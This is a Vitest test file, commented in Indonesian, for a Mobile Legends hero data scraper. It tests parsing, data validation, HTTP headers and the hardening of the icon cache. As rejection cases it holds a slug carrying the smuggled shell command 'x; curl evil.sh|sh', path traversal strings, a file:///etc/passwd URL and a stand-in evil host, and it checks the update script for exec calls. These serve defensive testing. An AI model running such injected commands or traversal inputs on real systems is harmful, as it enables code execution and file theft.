import { describe, expect, it } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  parseHeroPage,
  normalizeLane,
  normalizeRole,
  heroNameFallback,
  isValidHeroName,
  isValidSlug,
  isAllowedIconUrl,
  tierScore,
  ppToScore,
  isValidCounter,
  isValidMeta,
} from '../scripts/parse.mjs';
import { USER_AGENT, buildHeaders } from '../scripts/http.mjs';
import { cacheIcons } from '../scripts/cache-icons.mjs';
import packageJson from '../package.json';
import countersJson from '../data/counters.json';
import heroesJson from '../data/heroes.json';
import metaJson from '../data/meta.json';

describe('scripts/parse', () => {
  it('nama dari <title>, bukan breadcrumb Heroes (regresi bug import)', () => {
    const html =
      '<html><head><title>MLBB Rafaela Build, Guide</title></head><body><a href="/heroes">Heroes</a><a href="/roles/support">x</a>How to Build Rafaela in Mobile Legends: Roam</body></html>';
    expect(parseHeroPage(html, 'rafaela').name).toBe('Rafaela');
  });
  it('title hilang -> fallback dari slug', () => {
    expect(parseHeroPage('<html></html>', 'yu-zhong').name).toBe('Yu Zhong');
  });
  it('lane aneh dinormalisasi', () => {
    expect(normalizeLane('EXP')).toBe('Exp');
    expect(normalizeLane('Ranked')).toBe('Mid');
    expect(normalizeLane('Conceal')).toBe('Roam');
    expect(normalizeLane('Jungle')).toBe('Jungle');
    expect(normalizeLane('???')).toBe('Exp');
  });
  it('role aneh fallback Fighter', () => {
    expect(normalizeRole('tank')).toBe('Tank');
    expect(normalizeRole('bogus')).toBe('Fighter');
    expect(normalizeRole(null)).toBe('Fighter');
  });
  it('isValidHeroName tolak kata navigasi', () => {
    expect(isValidHeroName('Heroes')).toBe(false);
    expect(isValidHeroName('')).toBe(false);
    expect(isValidHeroName('Kaja')).toBe(true);
  });
  it('isValidSlug tolak path traversal + metakarakter shell', () => {
    expect(isValidSlug('yu-zhong')).toBe(true);
    expect(isValidSlug('popol-and-kupa')).toBe(true);
    expect(isValidSlug('../../evil')).toBe(false);
    expect(isValidSlug('a/../b')).toBe(false);
    expect(isValidSlug('x; curl evil.sh|sh')).toBe(false);
    expect(isValidSlug('Fanny')).toBe(false);
    expect(isValidSlug('')).toBe(false);
    expect(isValidSlug(null)).toBe(false);
    expect(isValidSlug('a'.repeat(41))).toBe(false);
  });
  it('isAllowedIconUrl hanya izinkan proxy gambar', () => {
    expect(isAllowedIconUrl('https://wsrv.nl/?url=https%3A%2F%2Fakmweb.youngjoygame.com%2F100_ab.png&w=128')).toBe(true);
    expect(isAllowedIconUrl('http://wsrv.nl/?url=x')).toBe(false);
    expect(isAllowedIconUrl('https://evil.example/100_ab.png')).toBe(false);
    expect(isAllowedIconUrl('file:///etc/passwd')).toBe(false);
    expect(isAllowedIconUrl(undefined)).toBe(false);
  });
  it('tierScore + ppToScore batas 0-100', () => {
    expect(tierScore('S')).toBe(10);
    expect(tierScore('Z')).toBe(5);
    expect(ppToScore(3.2)).toBe(8);
    expect(ppToScore(99)).toBe(10);
  });
  it('isValidCounter tolak self-counter + skor liar + tanpa sumber', () => {
    const ok = { source: 'a', target: 'b', type: 'COUNTER', score: 8, tags: ['x'], sources: ['u'] };
    expect(isValidCounter(ok)).toBe(true);
    expect(isValidCounter({ ...ok, source: 'a', target: 'a' })).toBe(false);
    expect(isValidCounter({ ...ok, score: 101 })).toBe(false);
    expect(isValidCounter({ ...ok, sources: [] })).toBe(false);
    expect(isValidCounter({ ...ok, type: 'BOGUS' })).toBe(false);
  });
  it('isValidMeta tolak win_rate liar', () => {
    expect(isValidMeta({ hero: 'a', win_rate: 55, tier_score: 8 })).toBe(true);
    expect(isValidMeta({ hero: 'a', win_rate: 120, tier_score: 8 })).toBe(false);
  });
});

describe('data guards (behaviour script update)', () => {
  it('heroes: id unik, nama valid, lane/role valid, ikon lokal', () => {
    const ids = heroesJson.map((h) => h.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (const h of heroesJson as any[]) {
      expect(isValidHeroName(h.name), h.id).toBe(true);
      expect(['Exp', 'Jungle', 'Mid', 'Gold', 'Roam'].includes(h.lane), h.id).toBe(true);
      expect(h.roles.length).toBeGreaterThan(0);
      expect(h.icon, h.id).toMatch(/^\/icons\/[a-z0-9-]+\.webp$/);
    }
  });
  it('counters: semua row valid + referensi hero ada', () => {
    const ids = new Set((heroesJson as any[]).map((h) => h.id));
    for (const c of countersJson as any[]) {
      expect(isValidCounter(c), JSON.stringify(c)).toBe(true);
      expect(ids.has(c.source), c.source).toBe(true);
      expect(ids.has(c.target), c.target).toBe(true);
    }
  });
  it('meta: 1 row per hero, semua valid', () => {
    const ids = new Set((heroesJson as any[]).map((h) => h.id));
    expect((metaJson as any[]).length).toBe(ids.size);
    for (const m of metaJson as any[]) {
      expect(isValidMeta(m), JSON.stringify(m)).toBe(true);
      expect(ids.has(m.hero)).toBe(true);
    }
  });
  it('heroNameFallback tangani slug multi-kata', () => {
    expect(heroNameFallback('popol-and-kupa')).toBe('Popol And Kupa');
    expect(heroNameFallback('yi-sun-shin')).toBe('Yi Sun Shin');
  });
});

describe('scripts/http', () => {
  it('semua request pakai satu User-Agent (tidak ada literal ganda)', () => {
    // Format <package-name>/<version>: bot mengaku bot, tidak ada literal ganda.
    expect(USER_AGENT).toBe(`${packageJson.name}/${packageJson.version}`);
    expect(buildHeaders()).toEqual({ 'User-Agent': USER_AGENT });
  });
  it('header eksplisit menang, User-Agent tetap terpasang', () => {
    expect(buildHeaders({ Accept: 'application/json' })).toEqual({
      'User-Agent': USER_AGENT,
      Accept: 'application/json',
    });
    expect(buildHeaders({ 'User-Agent': 'custom/9' })['User-Agent']).toBe('custom/9');
  });
});

describe('harden script update', () => {
  it('data-update tidak memakai shell (no execSync/child_process)', () => {
    const src = fs.readFileSync(new URL('../scripts/data-update.mjs', import.meta.url), 'utf8');
    expect(/child_process|execSync|exec\(/.test(src)).toBe(false);
  });
  it('cache-icons: hero id berbahaya ditolak, tidak ada tulisan di luar dir', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'icons-'));
    const file = path.join(tmp, 'heroes.json');
    const dir = path.join(tmp, 'icons');
    fs.writeFileSync(file, JSON.stringify([{ id: '../../evil', icon: 'https://wsrv.nl/?url=x' }]));
    const res = await cacheIcons({ file, dir, log: () => {} });
    expect(res.ok).toBe(0);
    expect(res.fail).toEqual(['../../evil(slug-invalid)']);
    expect(fs.existsSync(path.join(tmp, 'evil.webp'))).toBe(false);
    expect(fs.existsSync(path.join(path.dirname(tmp), 'evil.webp'))).toBe(false);
    fs.rmSync(tmp, { recursive: true, force: true });
  });
  it('cache-icons: host ikon di luar proxy tidak diunduh', async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'icons-'));
    const file = path.join(tmp, 'heroes.json');
    fs.writeFileSync(file, JSON.stringify([{ id: 'kaja', icon: 'https://evil.example/100_ab.png' }]));
    const res = await cacheIcons({ file, dir: path.join(tmp, 'icons'), log: () => {} });
    expect(res.fail).toEqual(['kaja(host-invalid)']);
    expect(fs.existsSync(path.join(tmp, 'icons', 'kaja.webp'))).toBe(false);
    fs.rmSync(tmp, { recursive: true, force: true });
  });
});
